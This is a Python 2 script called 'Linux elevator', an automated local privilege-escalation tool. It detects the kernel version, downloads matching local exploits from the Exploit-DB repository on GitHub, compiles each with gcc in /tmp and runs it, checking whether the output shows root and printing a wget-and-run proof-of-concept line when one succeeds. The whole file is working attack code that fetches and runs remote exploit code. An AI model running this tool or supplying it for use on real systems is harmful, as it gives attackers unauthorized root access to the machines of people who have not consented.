#!/usr/bin/python
import csv
import threading
import urllib

import os

import time

import sys

version = '0.1'
db = "files.csv"
keywords = ['linux', 'kernel', 'x86_64', '4.11']

end = False


def run(exploit, url_opener):
    filename = exploit['file'][exploit['file'].rindex('/') + 1:]
    try:
        global end
        exploit_url = "https://raw.githubusercontent.com/offensive-security/exploit-database/master/" + exploit['file']
        url_opener.retrieve(exploit_url, filename)

        if end:
            return
        if filename.endswith('.c'):
            if len(exploit['description']) > 65:
                print 'Running exploit [%s] [%s]' % (filename[:-2], exploit['description'][:65])
            else:
                print 'Running exploit [%s] [%s]' % (filename[:-2], exploit['description'])
            compile_cmd = 'gcc %s -o %s -lpthread -pthread -lcrypt -lssl -ldl' % (filename, filename[:-2])
            run_command(compile_cmd)
            if os.path.exists(filename[:-2]):
                run_exploit = "./%s" % filename[:-2]
                i, o, e = os.popen3(run_exploit, 'r')
                i.write('id\n')
                i.close()
                read = o.read()
                if 'uid=0(root) gid=0(root)' in read:
                    print '\nGot root!!\nID: [%s], PoC:\nwget %s --no-check-certificate; %s; %s;\n%s' % (
                        filename[:-2], exploit_url, compile_cmd, run_exploit, read)
                    end = True
                    sys.exit()
                o.close()
    except Exception as e:
        print str(e)
    run_command('rm %s' % filename)
    run_command('rm %s' % filename[:-2])


def run_command(compile_cmd):
    i, o, e = os.popen3(compile_cmd, 'r')
    i.close()
    out = o.read()
    o.close()
    e.close()
    return out


def find_keywords(uname_out):
    tokens = uname_out.split(' ')
    return {'os': tokens[0].lower(), 'version': (tokens[2][:tokens[2].index('.', 2)])}


kernel = find_keywords(os.popen('uname -a', 'r').read())

if __name__ == "__main__":
    print '\n#### Linux elevator v%s ####\n' % version
    os.chdir('/tmp')
    if not os.path.exists(db):
        print 'missing DB file, downloading...'
        urllib.URLopener().retrieve("https://raw.githubusercontent.com/offensive-security/exploit-database/master/files.csv", db)

    reader = csv.DictReader(open(db, 'r'), ['id', 'file', 'description', 'date', 'author', 'platform', 'type', 'port'])
    print 'Finding exploits for %s kernel %s\n' % (kernel['os'], kernel['version'])
    for row in reader:
        if end:
            os._exit(0)
        if (row['platform'].lower() == kernel['os'] or row['platform'].lower() == 'lin_x86') and row['type'] == 'local' and kernel['version'] in row['description'].lower():
            threading.Thread(target=run, args=[row, urllib.URLopener()]).start()
            time.sleep(0.8)
